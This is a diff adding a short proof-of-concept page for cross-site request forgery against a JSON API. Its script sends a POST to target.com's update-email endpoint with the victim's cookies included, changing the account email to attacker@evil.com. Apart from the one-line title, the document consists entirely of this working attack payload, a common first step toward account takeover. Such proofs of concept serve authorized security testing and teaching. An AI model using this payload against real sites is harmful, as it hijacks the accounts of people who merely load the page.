@@ -1,0 +1,22 @@
+CSRF POC for JSON request
+
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CSRF PoC</h2>
+
+<script>
+fetch("https://target.com/api/update-email", {
+  method: "POST",
+  credentials: "include", // sends victim cookies
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    "email": "attacker@evil.com"
+  })
+});
+</script>
+
+</body>
+</html>
